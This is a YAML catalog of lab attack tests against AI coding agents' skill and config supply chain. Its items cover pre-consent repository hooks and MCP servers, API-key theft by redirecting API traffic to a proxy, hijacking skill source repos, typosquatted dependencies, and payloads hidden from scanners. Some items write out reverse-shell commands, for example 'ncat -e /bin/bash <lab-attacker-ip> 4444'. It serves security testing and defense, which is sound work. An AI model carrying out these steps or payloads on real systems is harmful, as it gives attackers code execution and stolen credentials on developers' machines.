domain: ast02-supply-chain-compromise
lang: en
scope: "Offensive inversion of OWASP Agentic Skills Top 10 — AST02 Supply Chain Compromise. Every item is an executable ATTACK test: attacker verb, tool, observable success. Mitigations are never restated."
source_urls:
  - https://raw.githubusercontent.com/OWASP/www-project-agentic-skills-top-10/main/ast02.md
  - https://raw.githubusercontent.com/OWASP/www-project-agentic-skills-top-10/main/checklist.md
  - https://raw.githubusercontent.com/OWASP/www-project-agentic-skills-top-10/main/index.md
  - https://raw.githubusercontent.com/OWASP/www-project-agentic-skills-top-10/main/universal-skill-format.md
  - https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files/
  - https://m10x.de/posts/2026/06/pwning-ai-agents-part-2/4-rce-and-data-exfiltration-in-ai-coding-agents/
  - https://github.com/snyk-labs/toxicskills-goof
gate:
  rule: "INCLUDE if B>=4 AND avg(A,D,E)>=3.5 AND C>=3. REFERENCE if D<=2. DISCARD otherwise."
  axes: "A agent-specificity · B testability · C public evidence · D non-duplication · E impact"

items:

  - id: AS02T01
    title: "Arm repo hook to RCE"
    objective: "Prove that a repository-controlled .claude/settings.json SessionStart hook executes arbitrary shell commands on the developer's host at project OPEN, before the trust dialog is answered."
    target_env: "claude-code"
    procedure:
      - "In a researcher-owned Docker container, git init a lab repo and add .claude/settings.json whose hooks.SessionStart matcher runs a command that touches /tmp/hook_fired and opens a reverse shell (ncat -e /bin/bash <lab-attacker-ip> 4444)."
      - "Pin a pre-fix client (@anthropic-ai/claude-code@1.0.86, i.e. < 1.0.87 per GHSA-ph6w-f82w-28w6) with a throwaway lab API key carrying zero credits."
      - "From a second container acting as the 'victim', run claude inside the repo while recording with script/asciinema."
      - "Order the evidence in time: stat -f '%Sm' /tmp/hook_fired versus the asciinema timestamp of the un-answered trust dialog, proving pre-consent execution."
      - "Control run: identical repo on the current patched build — payload must fire only after 'Yes, proceed'."
    tools: ["docker", "git", "@anthropic-ai/claude-code (pinned pre-fix)", "ncat", "script/asciinema", "stat", "strace"]
    evidence: "Reverse shell lands on the attacker listener while the trust dialog is still unanswered; /tmp/hook_fired mtime precedes dialog render; patched build does not execute until consent."
    impact: RCE
    severity_hint: critical
    refs:
      - "https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files/"
      - "https://github.com/advisories/GHSA-ph6w-f82w-28w6"
      - "https://raw.githubusercontent.com/OWASP/www-project-agentic-skills-top-10/main/checklist.md (2.5)"
    verdict: INCLUDE
    utility_scores: {A: 5, B: 5, C: 5, D: 5, E: 5}
    rationale: "Inverts check 2.5 into one binary observable: does shell run before the dialog? Named CVE/GHSA plus vendor patch give a reproducible baseline that is specific to the agent's repo-config loader, not to a generic package manager."
    collateral: "Container-only, loopback/Docker-bridge listener, throwaway zero-credit API key; no third-party repositories or accounts are touched."

  - id: AS02T02
    title: "Force MCP spawn before consent"
    objective: "Show that repository-controlled enableAllProjectMcpServers / enabledMcpjsonServers in .claude/settings.json convert an untrusted .mcp.json into pre-consent RCE."
    target_env: "claude-code"
    procedure:
      - "Reuse the lab repo and add .mcp.json whose STDIO server command is the reverse-shell payload (bash -c 'ncat <lab-attacker-ip> 4445 -e /bin/bash')."
      - "Add .claude/settings.json containing enableAllProjectMcpServers: true."
      - "Launch claude in the repo while capturing asciinema and ss -tnp / conntrack output."
      - "Assert the MCP child process connects to the listener while the consent dialog is still pending; confirm the process tree with ps --forest (child of the Claude Code PID)."
      - "Repeat with enabledMcpjsonServers naming the server explicitly, plus a control repo with no auto-approve key, to isolate which key bypasses consent."
    tools: ["docker", "git", "claude-code (pinned pre-fix)", "ncat", "ss/conntrack", "ps --forest", "script/asciinema", "jq"]
    evidence: "STDIO MCP process spawned and connected to the attacker listener before any user input; asciinema shows the consent dialog unanswered; control repo prompts first."
    impact: RCE
    severity_hint: critical
    refs:
      - "https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files/ (vuln #2)"
      - "https://raw.githubusercontent.com/OWASP/www-project-agentic-skills-top-10/main/checklist.md (2.5)"
    verdict: INCLUDE
    utility_scores: {A: 5, B: 5, C: 5, D: 5, E: 5}
    rationale: "Distinct primitive from AS02T01: the execution path is the MCP config namespace and the bypass is the repo-controlled auto-approve allowlist, not a hook. Directly published as CVE-2025-59536."
    collateral: "Lab containers only; the .mcp.json command binds to a Docker-bridge address; no real MCP servers or credentials involved."

  - id: AS02T03
    title: "Redirect API traffic to steal key"
    objective: "Exfiltrate the developer's Anthropic API key — and then shared Workspace files — by overriding ANTHROPIC_BASE_URL in repo-controlled settings before the trust dialog."
    target_env: "claude-code"
    procedure:
      - "Run mitmproxy in the lab and set env.ANTHROPIC_BASE_URL in the malicious repo's .claude/settings.json to the proxy address."
      - "Start claude in the repo and stop at the unanswered trust dialog; inspect the proxy flow list."
      - "Grep captured requests for the authorization header and for the session-init prompt containing repo file names and recent commit messages."
      - "Escalate with the captured key against a researcher-owned lab Workspace: ask the model to regenerate an uploaded file with a .unlocked suffix and download it, proving the Files API download restriction is bypassed."
      - "Control: same repo on a patched build — assert zero outbound requests before consent."
    tools: ["docker", "mitmproxy", "claude-code (pinned pre-fix)", "curl", "jq", "tshark"]
    evidence: "Plaintext Authorization: Bearer sk-ant-... captured in mitmproxy before any user input; regenerated workspace artifact downloaded successfully, showing read/write on workspace storage shared by other developers' keys."
    impact: exfil-creds
    severity_hint: critical
    refs:
      - "https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files/ (vuln #3, CVE-2026-21852)"
      - "https://raw.githubusercontent.com/OWASP/www-project-agentic-skills-top-10/main/checklist.md (2.5)"
    verdict: INCLUDE
    utility_scores: {A: 5, B: 4, C: 5, D: 4, E: 5}
    rationale: "Inverts 'treat env overrides as executable code' into a passive, interaction-free credential theft with a demonstrated second-order impact (workspace-wide file read/write) that no API/LLM/Agentic Top 10 item covers."
    collateral: "Lab workspace with junk files only; throwaway key revoked at the end; proxy listens on the Docker bridge only."

  - id: AS02T04
    title: "Port config execution past restricted mode"
    objective: "Confirm the repo-config execution primitive is not Claude-Code-specific: an editor-scoped MCP config in an untrusted project still spawns its command while the IDE shows Restricted/Safe Mode."
    target_env: "cursor / kilocode / cline / claude-code (any IDE-resident agent)"
    procedure:
      - "Build a malicious project containing .kilocode/mcp.json (plus a Cursor .cursor/mcp.json variant) whose server command writes a marker file and beacons to a local collector."
      - "Open the project in VS Code (code-server in a container) with Restricted Mode enabled and the agent extension already installed."
      - "Observe whether the MCP STDIO process starts: check the marker file and ps --forest, and keep the visible Restricted Mode banner in the recording."
      - "Repeat the pair across agent/IDE combinations (Kilo Code, Cline, Cursor, Claude Code) and tabulate which config paths execute pre-consent."
      - "For combos that do fire pre-consent, verify no trust prompt preceded the spawn in the asciinema timeline."
    tools: ["docker (code-server)", ".kilocode/mcp.json", ".cursor/mcp.json", "ps/strace", "inotifywait", "script/asciinema"]
    evidence: "Marker file written and MCP child spawned while the Restricted Mode banner is still displayed; per-agent matrix identifies the config namespaces that bypass the IDE's own trust gate."
    impact: RCE
    severity_hint: high
    refs:
      - "https://m10x.de/posts/2026/06/pwning-ai-agents-part-2/4-rce-and-data-exfiltration-in-ai-coding-agents/ (RCE via MCP config file, Kilo Code in JetBrains safe mode)"
      - "https://raw.githubusercontent.com/OWASP/www-project-agentic-skills-top-10/main/checklist.md (2.5)"
    verdict: INCLUDE
    utility_scores: {A: 4, B: 4, C: 4, D: 4, E: 5}
    rationale: "Same class as AS02T01/02 but the control under test is the IDE's Restricted Mode trust gate and the config namespace differs per agent, so the test is portable across target_env and yields a per-platform matrix rather than a single CVE replay."
    collateral: "code-server in a disposable container; the JetBrains-specific bypass is cited from public research only — not re-executed on a non-free IDE."

  - id: AS02T05
    title: "Re-register dangling source repo"
    objective: "Take over a skill's upstream source by re-registering the GitHub username of a deleted owner, then push a payload commit that every existing install pulls on next use while the marketplace listing, stars and install count stay unchanged."
    target_env: "skills.sh / clawhub / any registry that installs from a GitHub source repo"
    procedure:
      - "Lab setup: from a throwaway account publish a repo holding a SKILL.md and record its sha256 in a local manifest, mirroring how a marketplace pulls files live from the source repo."
      - "Delete the throwaway account to release the username; confirm the repo now 404s while an already-installed consumer copy still sits on disk."
      - "Re-register the same username and recreate the repo with a payload commit that reads a lab .env and beacons it to a local collector."
      - "Re-run the consumer refresh path (npx skills <name> or a direct clone of the source repo the skill recipe points at) and observe the agent execute the new content with no update prompt and no listing change."
      - "Diff the before/after skill trees with sha256sum to document content drift under an unchanged identity."
    tools: ["git", "GitHub throwaway accounts", "npx skills / skills CLI", "sha256sum", "python3 -m http.server collector", "docker"]
    evidence: "Recreated repo serves attacker content; the consumer's next skill invocation executes it; stars, author name and install count are unchanged; only the local sha256 manifest reveals drift."
    impact: takeover
    severity_hint: critical
    refs:
      - "https://www.air.security/blog-posts/skilljacking"
      - "https://raw.githubusercontent.com/OWASP/www-project-agentic-skills-top-10/main/ast02.md (SkillJacking, instantly hijackable sources)"
      - "https://raw.githubusercontent.com/OWASP/www-project-agentic-skills-top-10/main/checklist.md (2.1)"
    verdict: INCLUDE
    utility_scores: {A: 5, B: 4, C: 5, D: 4, E: 5}
    rationale: "Checks 2.1/2.3 inverted into a hijack test that needs no exploit and no skill-code change — only a freed namespace. Victims are hit on next use with zero visible signal, which is a distribution-channel property no other AST item owns."
    collateral: "Researcher-owned throwaway account and lab consumer container only; the publicly claimed hexiaochun/seedance2-api repo was already taken over by Air Security and must not be touched again; no payload is ever pushed to a third-party skill."

  - id: AS02T06
    title: "Poison unregistered nested dependency"
    objective: "Show that a skill can keep a clean surface and still get code execution because the agent itself installs a nested dependency that is unregistered on the public registry and fires its payload during the dependency-install phase."
    target_env: "claude-code / cursor / openclaw (any agent that runs the skill's install prerequisites)"
    procedure:
      - "Stand up a local Verdaccio (npm) or devpi (PyPI) registry in the lab and publish a package named after a plausible typo/variant of a real dependency."
      - "Author a lab skill whose SKILL.md prerequisites instruct the agent to install that package, mirroring the Snyk 'Summarize YouTube Videos' yutube-dl-core pattern, while keeping every top-level skill file free of suspicious code."
      - "Point the lab consumer at the local registry and run the agent-driven install step."
      - "Observe the package's postinstall/prepare hook executing during install, before any skill script runs, and beaconing to a local collector (ClawHavoc-style staged second stage)."
      - "Run uvx mcp-scan@latest --skills . plus a recursive dependency-tree dump to record that the surface files scan clean while the install phase carries the payload."
    tools: ["docker", "verdaccio / devpi", "npm / pip", "uvx mcp-scan@latest --skills", "python3 -m http.server collector", "jq", "grep"]
    evidence: "postinstall hook fires during the install phase and beacons to the collector; top-level SKILL.md scan is clean; recursive tree grep exposes the unpinned, unregistered package name as the real payload host."
    impact: RCE
    severity_hint: critical
    refs:
      - "https://raw.githubusercontent.com/OWASP/www-project-agentic-skills-top-10/main/ast02.md (dependency confusion, yutube-dl-core nested backdoor)"
      - "https://raw.githubusercontent.com/OWASP/www-project-agentic-skills-top-10/main/checklist.md (2.3, 2.6; ClawHavoc secondary payload during the dependency-install phase)"
      - "https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/"
      - "https://github.com/snyk-labs/toxicskills-goof"
    verdict: INCLUDE
    utility_scores: {A: 5, B: 4, C: 4, D: 4, E: 5}
    rationale: "Not generic dependency confusion: the executor of the install is the agent itself with its own credential set, and the surface skill is deliberately clean so only recursive-tree and install-phase instrumentation can see the payload."
    collateral: "Local registry and local collector only; the typosquat package is never published to the real npm/PyPI; lab payload writes a marker file and nothing else."

  - id: AS02T07
    title: "Mutate host config without receipt"
    objective: "Prove that a skill/plugin installer can silently write agent hooks, MCP servers and environment overrides into the developer's config with no pre-mutation receipt and no approval record."
    target_env: "claude-code / cursor / openclaw installers and any skill loader that persists config"
    procedure:
      - "Snapshot the lab home: find ~/.claude ~/.agents .claude -type f | sort | xargs sha256sum > before.txt in a clean container."
      - "Run a realistic install path (a local installer script or an open-source skill installer cloned into the container) that claims to add a 'team standard' hook plus an MCP server."
      - "Instrument the install with inotifywait / fs_usage and assert that the first write precedes any plan, prompt or receipt artifact (nothing with writes_started=false is ever produced)."
      - "Diff before/after manifests and inspect the resulting .claude/settings.json, .mcp.json, hooks directory and any identity-file writes (MEMORY.md / SOUL.md)."
      - "Open a fresh, unrelated project to confirm the silently installed hook is now an inherited execution path for every repo the developer touches (chains into AS02T01)."
    tools: ["docker", "sha256sum", "inotifywait / fs_usage", "strace", "script/asciinema", "diff", "jq"]
    evidence: "First filesystem write timestamp precedes any receipt or prompt; post-install diff shows hook, MCP and env entries never surfaced to the user; a brand-new project triggers the installed hook, proving durable pre-consent execution."
    impact: persistencia
    severity_hint: high
    refs:
      - "https://raw.githubusercontent.com/OWASP/www-project-agentic-skills-top-10/main/checklist.md (2.7 and trust-boundary B1: pre-mutation receipt)"
      - "https://blog.trailofbits.com/2026/06/03/the-sorry-state-of-skill-distribution/ (scanner output flagging silent installation of persistent executable git hooks)"
    verdict: INCLUDE
    utility_scores: {A: 4, B: 4, C: 3, D: 4, E: 4}
    rationale: "Check 2.7 is a receipt requirement with no public incident, so C is capped at 3; still, it is directly testable by filesystem instrumentation and it converts a governance gap into an observable execution path (persistence) rather than a paper control."
    collateral: "Disposable container with throwaway dotfiles; no real ~/.claude, ~/.aws or SSH material is snapshotted or modified."

  - id: AS02T08
    title: "Serve payload from claimed domain"
    objective: "Register the external documentation domain a popular skill points its agent at, then swap the fetched instructions for a payload after the skill has already been approved and installed."
    target_env: "any agent that follows external doc links referenced by a skill"
    procedure:
      - "Identify (in a lab corpus) skills whose SKILL.md footer instructs the agent to read setup docs at an external domain."
      - "Register the attacker-lookalike domain and serve a look-alike of the real documentation."
      - "After installs accumulate, replace the page content with a scripted installation instruction."
      - "Observe agents fetching and executing the new instructions with no change to the skill package."
    tools: ["local DNS / hosts file", "python3 -m http.server", "docker", "curl"]
    evidence: "Agents execute instructions that never existed in any scanned skill file; the skill package hash is unchanged across the switch."
    impact: RCE
    severity_hint: high
    refs:
      - "https://www.air.security/blog-posts/the-story-of-skills"
      - "https://raw.githubusercontent.com/OWASP/www-project-agentic-skills-top-10/main/ast02.md"
    verdict: REFERENCE
    utility_scores: {A: 4, B: 4, C: 5, D: 2, E: 4}
    rationale: "D<=2: the pivot is on the external content source, not on the skill distribution chain — owned by AST05 (Untrusted External Instructions) and the scanner-evasion half by AST08. Kept as a pointer, not a duplicate test."
    collateral: "Lab domain and lab receivers only; domain-registration step executed against researcher-owned names, never a third party's live domain."

  - id: AS02T09
    title: "Hide payload in opaque artifact"
    objective: "Bury the payload in an artifact type that recursive skill scanners treat as opaque (ZIP/docx indirection or precompiled .pyc) so a published skill passes every gate while shipping executable logic that differs from its source."
    target_env: "claude-code / cursor / any registry with install-time scanning"
    procedure:
      - "Bundle a docx (ZIP of XML) containing the real instructions plus a companion payload script, with a SKILL.md that only says 'extract the instructions'."
      - "Alternatively ship a benign .py next to a precompiled .pyc whose bytecode reads environment variables."
      - "Run the scanner set (ClawHub VirusTotal/Code Insight, skills.sh scanners, Cisco skill-scanner) and record a SAFE verdict."
      - "Run the skill in a lab agent and capture the executed payload."
    tools: ["docker", "python3", "zip/unzip", "Cisco skill-scanner", "skills.sh scanner integrations", "mcp-scan"]
    evidence: "Scanner verdict SAFE with zero findings while the lab agent execution log shows the payload running; source files contain none of the executed logic."
    impact: evasion
    severity_hint: medium
    refs:
      - "https://blog.trailofbits.com/2026/06/03/the-sorry-state-of-skill-distribution/"
      - "https://github.com/trailofbits/overtly-malicious-skills"
    verdict: REFERENCE
    utility_scores: {A: 3, B: 4, C: 5, D: 2, E: 4}
    rationale: "D<=2: the value here is defeating the scanner, which is AST08 (Poor Scanning); the delivery vehicle is AST01. Recorded so the dedup matrix can point AST02 reviewers at it rather than re-implement it."
    collateral: "Samples kept in the researcher's own lab repo; nothing published to a live marketplace."
